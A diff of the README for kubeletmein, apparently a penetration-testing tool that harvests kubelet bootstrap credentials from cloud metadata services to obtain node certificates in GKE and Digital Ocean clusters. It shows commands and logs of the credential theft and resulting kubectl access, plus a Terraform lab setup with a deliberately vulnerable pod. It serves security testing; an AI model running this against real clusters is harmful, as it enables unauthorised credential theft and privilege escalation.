@@ -35,28 +35,27 @@ It's a single binary compiled for Linux. Download it with `cURL` or `wget` from 
 
 ## How to
 
+A breaking change in v0.11.0 and upwards means kubeletmein uses a single stage process for all providers. Therefore just takes a single argument for the provider and, depending on the provider (i.e. not EKS) a node-name will be required to generate the certificate for.
+
 ### GKE
 
-On GKE kubeletmein is a two stage process. First we write out a bootstrap-kubeconfig using the certificates and key from the `kube-env` instance attribute. Then we generate a certificate sigining request and use the bootstrap config to submit it to the API for approval.
-
 ```
-~ $ kubeletmein bootstrap gke
-2018-11-29T21:21:26Z [ℹ]  fetching kubelet creds from metadata service
-2018-11-29T21:21:26Z [ℹ]  writing ca cert to: ca-certificates.crt
-2018-11-29T21:21:26Z [ℹ]  writing kubelet cert to: kubelet.crt
-2018-11-29T21:21:26Z [ℹ]  writing kubelet key to: kubelet.key
-2018-11-29T21:21:26Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
-2018-11-29T21:21:26Z [ℹ]  wrote bootstrap-kubeconfig
-2018-11-29T21:21:26Z [ℹ]  now generate a new node certificate with: kubeletmein gke generate
-```
-
-Then we download the certificate and configure `kubeconfig`.
-
-```
-~ $ kubeletmein generate -n gke-cluster19-default-pool-6c73beb1-wmh3
-2018-11-29T21:23:33Z [ℹ]  using bootstrap-config to request new cert for node: gke-cluster19-default-pool-6c73beb1-wmh3
-2018-11-29T21:23:33Z [ℹ]  got new cert and wrote kubeconfig
-2018-11-29T21:23:33Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+root@kubeletmein-vulnerable:/# kubeletmein gke -n foo
+2021-03-04T22:25:52Z [ℹ]  fetching kubelet creds from metadata service
+2021-03-04T22:25:52Z [ℹ]  writing ca cert to: ca-certificates.crt
+2021-03-04T22:25:52Z [ℹ]  writing kubelet cert to: kubelet.crt
+2021-03-04T22:25:52Z [ℹ]  writing kubelet key to: kubelet.key
+2021-03-04T22:25:52Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
+2021-03-04T22:25:52Z [ℹ]  wrote bootstrap-kubeconfig
+2021-03-04T22:25:52Z [ℹ]  using bootstrap-config to request new cert for node: foo
+2021-03-04T22:25:53Z [ℹ]  got new cert and wrote kubeconfig
+2021-03-04T22:25:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
+NAME                     READY   STATUS    RESTARTS   AGE
+kubeletmein-vulnerable   1/1     Running   0          12m
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get nodes
+NAME                                                  STATUS   ROLES    AGE   VERSION
+gke-kubeletmein-kubeletmein-vulnerabl-6623dbee-mgkd   Ready    <none>   11m   v1.18.12-gke.1210
 ```
 
 Now you can use the kubeconfig, as it suggests.
@@ -92,20 +91,51 @@ kubectl --kubeconfig kubeconfig get pods
 ### Digital Ocean
 
 ```
-~ $ kubeletmein bootstrap do
+~ $ kubeletmein do -n whatevs
 2018-12-12T23:34:19Z [ℹ]  fetching kubelet creds from metadata service
 2018-12-12T23:34:19Z [ℹ]  writing ca cert to: ca-certificates.crt
 2018-12-12T23:34:19Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
 2018-12-12T23:34:19Z [ℹ]  wrote bootstrap-kubeconfig
 2018-12-12T23:34:19Z [ℹ]  now generate a new node certificate with: kubeletmein do generate
-```
-
-Now generate the kubeconfig with a downloaded cert
-```
-~ $ kubeletmein generate -n whatevs
 2018-12-12T23:36:46Z [ℹ]  using bootstrap-config to request new cert for node: whatevs
 2018-12-12T23:36:46Z [ℹ]  got new cert and wrote kubeconfig
 2018-12-12T23:36:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+```
+
+## Testing
+
+### Terraform
+
+To simplify the process, if you want to fire up some clusters to test this on, there are example Terraform configurations provided in the `deploy/terraform` directory. There is one per cloud provider supported. You will need to provide credentials for the provider. If you're not sure how to do this head over to the Terraform website and checkout the relevant provider docs.
+
+AWS - (https://registry.terraform.io/providers/hashicorp/aws/latest/docs)[https://registry.terraform.io/providers/hashicorp/aws/latest/docs]
+GCP - (https://registry.terraform.io/providers/hashicorp/google/latest/docs)[https://registry.terraform.io/providers/hashicorp/google/latest/docs]
+Digital Ocean - (https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs)[https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs]
+
+** NOTE - ONLY GKE IS CURRENTLY RELEASED, OTHERS ARE COMING VERY SOON **
+
+Each folder has a `Makefile` you can use if you wish to init, plan and apply the configs. You can update the `terraform.tfvars` with the necessary changes or set `TF_VAR_xx` variables. However you prefer.
+
+The plans will create a cluster and then deploy the `4armed/kubeletmein` container image in a pod. You can then exec into this pod and run the tool. Here is output from running this on GKE.
+
+```bash
+$ kubectl exec -ti kubeletmein-vulnerable bash
+root@kubeletmein-vulnerable:/# kubeletmein gke -n foo
+2021-03-04T22:25:52Z [ℹ]  fetching kubelet creds from metadata service
+2021-03-04T22:25:52Z [ℹ]  writing ca cert to: ca-certificates.crt
+2021-03-04T22:25:52Z [ℹ]  writing kubelet cert to: kubelet.crt
+2021-03-04T22:25:52Z [ℹ]  writing kubelet key to: kubelet.key
+2021-03-04T22:25:52Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
+2021-03-04T22:25:52Z [ℹ]  wrote bootstrap-kubeconfig
+2021-03-04T22:25:52Z [ℹ]  using bootstrap-config to request new cert for node: foo
+2021-03-04T22:25:53Z [ℹ]  got new cert and wrote kubeconfig
+2021-03-04T22:25:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
+NAME                     READY   STATUS    RESTARTS   AGE
+kubeletmein-vulnerable   1/1     Running   0          12m
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get nodes
+NAME                                                  STATUS   ROLES    AGE   VERSION
+gke-kubeletmein-kubeletmein-vulnerabl-6623dbee-mgkd   Ready    <none>   11m   v1.18.12-gke.1210
 ```
 
 ## Contributing
